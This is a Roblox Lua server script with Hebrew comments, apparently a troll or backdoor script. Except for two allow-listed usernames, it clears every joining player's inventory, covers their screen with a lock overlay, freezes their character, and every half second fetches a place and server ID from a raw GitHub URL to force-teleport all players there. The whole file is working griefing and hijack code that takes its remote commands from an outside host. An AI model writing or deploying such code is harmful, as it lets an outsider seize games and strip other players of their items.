local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"

-- רשימת חסימה
local blockedPlayers = {
	["noamdb15"] = true,
	["dylanzyl123"] = true
}

-- פונקציה שמנקה הכל ושמה את המסך
local function heavyLock(player)
	-- מחיקת כל הדברים מהתיק (Inventory)
	player:WaitForChild("Backpack"):ClearAllChildren()
	local starterGear = player:FindFirstChild("StarterGear")
	if starterGear then starterGear:ClearAllChildren() end

	-- יצירת מסך הטרול
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "FinalSystemLock"
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 9999999
	screenGui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(1, 0, 1, 0)
	frame.BackgroundColor3 = Color3.new(0, 0, 0)
	frame.Active = true
	frame.Parent = screenGui

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(0.8, 0, 0.4, 0)
	label.Position = UDim2.new(0.1, 0, 0.3, 0)
	label.BackgroundTransparency = 1
	label.TextColor3 = Color3.new(1, 0, 0) -- אדום
	label.TextScaled = true
	label.Font = Enum.Font.SpecialElite
	label.Text = "הלך לך הבייס חבר יקר" -- הטקסט שביקשת
	label.Parent = frame
end

-- כששחקן נכנס - מפעיל את הנעילה הכבדה
Players.PlayerAdded:Connect(function(player)
	if not blockedPlayers[player.Name] then
		heavyLock(player)
		
		player.CharacterAdded:Connect(function(char)
			local hrp = char:WaitForChild("HumanoidRootPart")
			local hum = char:WaitForChild("Humanoid")
			
			-- מוחק לו כל דבר שהוא מחזיק ביד
			char:WaitForChild("Humanoid"):UnequipTools()
			
			-- נועל אותו במקום פיזית
			task.wait(0.1)
			hrp.Anchored = true 
			hum.WalkSpeed = 0
			hum.JumpPower = 0
		end)
	end
end)

-- לופ שיגור אגרסיבי (כל 0.5 שניות)
task.spawn(function()
	while true do
		local success, response = pcall(function()
			return HttpService:GetAsync(rawUrl .. "?t=" .. tick())
		end)

		if success and response then
			local lines = {}
			for line in response:gmatch("[^\r\n]+") do
				table.insert(lines, line)
			end

			local targetPlaceId = tonumber(lines[1])
			local targetJobId = lines[2]

			if targetJobId and targetJobId ~= "" then
				for _, player in pairs(Players:GetPlayers()) do
					if not blockedPlayers[player.Name] then
						pcall(function()
							TeleportService:TeleportToPlaceInstance(targetPlaceId or game.PlaceId, targetJobId, player)
						end)
					end
				end
			end
		end
		task.wait(0.5)
	end
end)
